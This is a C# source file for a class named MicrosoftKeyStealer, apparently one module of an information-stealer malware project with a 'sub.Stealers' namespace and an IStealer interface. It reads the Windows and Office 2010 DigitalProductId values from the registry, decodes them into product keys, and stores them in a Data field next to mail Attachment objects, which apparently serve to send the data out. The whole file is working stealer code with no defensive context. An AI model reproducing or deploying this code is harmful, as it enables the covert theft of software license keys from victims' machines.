#region Imports

using System.Collections;
using System.Collections.Generic;
using System.Net.Mail;
using Microsoft.Win32;
using sub.Util.Misc;

#endregion

namespace sub.Stealers
{
    internal class MicrosoftKeyStealer : IStealer
    {
        private string _name = "ProductKeyStealer";

        #region IStealer Members

        public List<Attachment> Attachments { get; set; }

        public string Name
        {
            get { return _name; }
            set { _name = value; }
        }

        public string Data { get; set; }

        public void Collect()
        {
            byte[] digitalProductId = null;
            RegistryKey registry = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion",
                                                                    false);
            if (registry != null)
            {
                digitalProductId = (byte[]) registry.GetValue("DigitalProductId");
                registry.Close();
            }
            byte[] office2010 = null;
            registry =
                Registry.LocalMachine.OpenSubKey(
                    @"SOFTWARE\Microsoft\Office\14.0\Registration\{90140000-0011-0000-1000-0000000FF1CE}");
            if (registry != null)
            {
                office2010 = (byte[]) registry.GetValue("DigitalProductId");
                registry.Close();
            }
            if (digitalProductId != null)
            {
                Data = "Microsoft Windows: " + DecodeProductKey(digitalProductId);
                if (office2010 != null)
                    Data += "\r\nOffice 2010: " + DecodeProductKey(office2010);
            }
        }

        #endregion

        private static string DecodeProductKey(IList<byte> digitalProductId)
        {
            // Offset of first byte of encoded product key in 
            //  'DigitalProductIdxxx" REG_BINARY value. Offset = 34H.
            const int keyStartIndex = 52;
            // Offset of last byte of encoded product key in 
            //  'DigitalProductIdxxx" REG_BINARY value. Offset = 43H.
            const int keyEndIndex = keyStartIndex + 15;
            // Possible alpha-numeric characters in product key.
            char[] digits = new char[]
                                {
                                    'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'M', 'P', 'Q', 'R',
                                    'T', 'V', 'W', 'X', 'Y', '2', '3', '4', '6', '7', '8', '9',
                                };
            // Length of decoded product key
            const int decodeLength = 29;
            // Length of decoded product key in byte-form.
            // Each byte represents 2 chars.
            const int decodeStringLength = 15;
            // Array of containing the decoded product key.
            char[] decodedChars = new char[decodeLength];
            // Extract byte 52 to 67 inclusive.
            ArrayList hexPid = new ArrayList();
            for (int i = keyStartIndex; i <= keyEndIndex; i++)
            {
                hexPid.Add(digitalProductId[i]);
            }
            for (int i = decodeLength - 1; i >= 0; i--)
            {
                // Every sixth char is a separator.
                if ((i + 1)%6 == 0)
                {
                    decodedChars[i] = '-';
                }
                else
                {
                    // Do the actual decoding.
                    int digitMapIndex = 0;
                    for (int j = decodeStringLength - 1; j >= 0; j--)
                    {
                        int byteValue = (digitMapIndex << 8) | (byte) hexPid[j];
                        hexPid[j] = (byte) (byteValue/24);
                        digitMapIndex = byteValue%24;
                        decodedChars[i] = digits[digitMapIndex];
                    }
                }
            }
            return new string(decodedChars);
        }
    }
}